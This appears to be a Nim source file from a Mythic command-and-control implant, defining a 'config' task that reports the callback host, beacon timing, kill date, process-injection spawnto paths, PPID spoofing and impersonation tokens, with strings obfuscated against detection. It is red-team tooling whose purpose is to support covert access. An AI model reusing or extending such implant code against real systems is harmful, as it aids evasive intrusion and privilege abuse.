import ../config
import ../utils/mythic_responses
import ../global_data
import ../tasks/token_manager
import ../utils/debug
import ../utils/strenc
import std/[json, strformat]

proc config*(taskId: string, params: JsonNode): JsonNode =
  ## Display current agent configuration
  let cfg = getConfig()
  
  try:
    debug "[DEBUG] config: Getting configuration"
    
    var output = ""
    output &= obf("=== Agent Configuration ===\n")
    output &= obf("UUID: ") & cfg.uuid & "\n"
    output &= obf("Callback Host: ") & cfg.callbackHost & ":" & $cfg.callbackPort & "\n"
    output &= obf("Callback Interval: ") & $cfg.callbackInterval & "s\n"
    output &= obf("Callback Jitter: ") & $cfg.callbackJitter & "%\n"
    output &= obf("Kill Date: ") & cfg.killdate & "\n"
    
    when defined(windows):
      output &= obf("\n=== Process Injection Configuration ===\n")
      let (x64Path, x64Args) = getSpawntoX64()
      let (x86Path, x86Args) = getSpawntoX86()
      output &= obf("spawnto_x64: ") & x64Path & "\n"
      if x64Args.len > 0:
        output &= obf("spawnto_x64_arguments: ") & x64Args & "\n"
      output &= obf("spawnto_x86: ") & x86Path & "\n"
      if x86Args.len > 0:
        output &= obf("spawnto_x86_arguments: ") & x86Args & "\n"
      
      let ppid = getPpid()
      if ppid != 0:
        output &= obf("PPID Spoofing: ") & $ppid & "\n"
      
      # Token information
      let tokenHandle = getTokenHandle()
      if tokenHandle != 0:
        output &= obf("\n=== Token Information ===\n")
        output &= obf("Impersonation Token: Active (Handle: ") & $tokenHandle & ")\n"
        let username = getCurrentUsername()
        if username.len > 0:
          output &= obf("Current User: ") & username & "\n"
    
    return mythicSuccess(taskId, output)
    
  except Exception as e:
    return mythicError(taskId, obf("config error: ") & e.msg)
